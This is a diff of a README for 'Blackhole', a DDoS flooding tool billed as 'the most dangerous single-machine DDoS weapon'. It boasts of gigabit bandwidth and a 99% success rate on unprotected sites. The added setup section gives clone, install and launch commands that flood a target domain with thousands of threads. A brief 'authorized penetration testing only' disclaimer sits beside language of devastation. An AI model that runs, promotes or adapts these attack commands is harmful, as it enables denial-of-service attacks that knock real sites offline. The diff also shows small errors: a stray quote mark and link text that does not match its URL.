@@ -5,7 +5,18 @@ Blackhole is the most dangerous DDoS tool designed for authorized penetration te
 ⚡ BANDWIDTH: 1-5 Gbps from 1 VPS
 ⚡ SUCCESS RATE: 99% on unprotected sites
 ⚡ THREADS: 2,000-10,000 concurrent
- 🎯 ATTACK VECTORS (Multi-Layer Devastation)
+ 🔒 SETUP (Kali Linux)
+ # 1. Clone & Install
+git clone [https://github.com/yourusername/blackhole-ddos](https://github.com/SilentProfessor/cautious-octo-BlackHole)
+cd cautious-octo-BlackHole
+sudo chmod +X *
+sudo ./Require.sh
+
+# 2. Launch Attack
+ sudo python3 blackhole.py target.com -t 5000"
+ or 
+  sudo python blackhole.py -p 443 -t 1000 -d 20 Target.com
+  
  ## 🎯 ATTACK VECTORS (Multi-Layer Devastation)
 
 | Vector | % Allocation | Multiplier | Impact | PPS |
@@ -101,13 +112,4 @@ MIT License + Pentest Authorization Required
 ❌ NO CRIMINAL USE permitted
 Most dangerous single-machine DDoS weapon for authorized penetration testing only! 💀⚡🔥
 
-**# 1. Clone & setup (root required)
-git clone https://github.com/yourusername/blackhole-ddos
-cd blackhole-ddos
-sudo python3 -m pip install -r requirements.txt
 
-# 2. VALIDATE TARGET RESILIENCY (10s test)
-sudo python3 blackhole.py target.com -t 5000 -d 10
-
-# 3. FULL CAPACITY TEST (30s)
-sudo python3 blackhole.py target.com -t 10000 -d 30 -p 443 **
